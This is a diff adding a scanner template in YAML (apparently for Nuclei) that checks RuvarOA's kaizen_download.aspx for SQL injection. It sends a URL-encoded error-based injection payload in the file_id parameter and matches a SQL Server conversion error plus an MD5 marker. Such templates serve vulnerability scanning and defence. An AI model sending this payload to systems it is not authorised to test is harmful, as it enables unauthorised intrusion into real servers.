@@ -1,0 +1,28 @@
+id: poc-yaml-ruvaroa-kaizen-download-aspx-sqli
+info:
+  name: RuvarOA kaizen_download.aspx SQL Injection Vulnerability
+  severity: high
+  tags: sql-injection
+  author: ProjectDiscoveryAI
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%29%3E0-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
+        part: body
